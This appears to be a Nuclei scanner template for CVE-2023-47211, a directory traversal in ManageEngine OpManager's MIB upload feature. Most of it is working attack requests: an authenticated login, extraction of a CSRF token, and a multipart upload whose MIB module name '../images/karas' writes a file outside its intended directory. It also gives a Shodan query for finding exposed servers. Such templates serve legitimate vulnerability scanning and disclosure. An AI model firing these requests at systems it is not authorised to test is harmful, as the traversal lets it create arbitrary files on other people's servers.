http:
- extractors:
  - group: 1
    internal: true
    name: x_zcsrf_token
    part: header
    regex:
    - 'Set-Cookie: opmcsrfcookie=([^;]{50,})'
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains(body, "MIBFile with same name already exists")
    type: dsl
  max-redirects: 3
  raw:
  - 'POST /two_factor_auth HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    j_username={{username}}&j_password={{password}}

    '
  - "POST /client/api/json/mibbrowser/uploadMib HTTP/1.1\nHost: {{Hostname}}\nX-ZCSRF-TOKEN:\
    \ opmcsrftoken={{x_zcsrf_token}}\nContent-Type: multipart/form-data; boundary=---------------------------372334936941313273904263503262\n\
    \n-----------------------------372334936941313273904263503262\nContent-Disposition:\
    \ form-data; name=\"mibFile\"; filename=\"karas.txt\"\nContent-Type: text/plain\n\
    \n../images/karas DEFINITIONS ::= BEGIN\n\n\nIMPORTS\n    enterprises\n      \
    \  FROM RFC1155-SMI;\n\nmicrosoft       OBJECT IDENTIFIER ::= { enterprises 311\
    \ }\nsoftware        OBJECT IDENTIFIER ::= { microsoft 1 }\nsystems         OBJECT\
    \ IDENTIFIER ::= { software 1 }\nos              OBJECT IDENTIFIER ::= { systems\
    \ 3 }\nwindowsNT       OBJECT IDENTIFIER ::= { os 1 }\nwindows         OBJECT\
    \ IDENTIFIER ::= { os 2 }\nworkstation     OBJECT IDENTIFIER ::= { windowsNT 1\
    \ }\nserver          OBJECT IDENTIFIER ::= { windowsNT 2 }\ndc              OBJECT\
    \ IDENTIFIER ::= { windowsNT 3 }\n\nEND\n\n-----------------------------372334936941313273904263503262--\n"
  - "POST /client/api/json/mibbrowser/uploadMib HTTP/1.1\nHost: {{Hostname}}\nX-ZCSRF-TOKEN:\
    \ opmcsrftoken={{x_zcsrf_token}}\nContent-Type: multipart/form-data; boundary=---------------------------372334936941313273904263503262\n\
    \n-----------------------------372334936941313273904263503262\nContent-Disposition:\
    \ form-data; name=\"mibFile\"; filename=\"karas.txt\"\nContent-Type: text/plain\n\
    \n../images/karas DEFINITIONS ::= BEGIN\n\n\nIMPORTS\n    enterprises\n      \
    \  FROM RFC1155-SMI;\n\nmicrosoft       OBJECT IDENTIFIER ::= { enterprises 311\
    \ }\nsoftware        OBJECT IDENTIFIER ::= { microsoft 1 }\nsystems         OBJECT\
    \ IDENTIFIER ::= { software 1 }\nos              OBJECT IDENTIFIER ::= { systems\
    \ 3 }\nwindowsNT       OBJECT IDENTIFIER ::= { os 1 }\nwindows         OBJECT\
    \ IDENTIFIER ::= { os 2 }\nworkstation     OBJECT IDENTIFIER ::= { windowsNT 1\
    \ }\nserver          OBJECT IDENTIFIER ::= { windowsNT 2 }\ndc              OBJECT\
    \ IDENTIFIER ::= { windowsNT 3 }\n\nEND\n\n-----------------------------372334936941313273904263503262--\n"
id: CVE-2023-47211
info:
  author: gy741
  classification:
    cpe: cpe:2.3:a:zohocorp:manageengine_firewall_analyzer:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-47211
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
    epss-percentile: 0.53022
    epss-score: 0.00164
  description: 'A directory traversal vulnerability exists in the uploadMib functionality
    of ManageEngine OpManager 12.7.258. A specially crafted HTTP request can lead
    to arbitrary file creation. An attacker can send a malicious MiB file to trigger
    this vulnerability.

    '
  metadata:
    max-request: 3
    product: manageengine_firewall_analyzer
    shodan-query: http.title:"OpManager Plus"
    vendor: zohocorp
  name: ManageEngine OpManager - Directory Traversal
  reference:
  - https://talosintelligence.com/vulnerability_reports/TALOS-2023-1851
  - https://nvd.nist.gov/vuln/detail/CVE-2023-47211
  - https://github.com/fkie-cad/nvd-json-data-feeds
  severity: high
  tags: cve,cve2023,zoho,manageengine,authenticated,traversal,lfi,intrusive
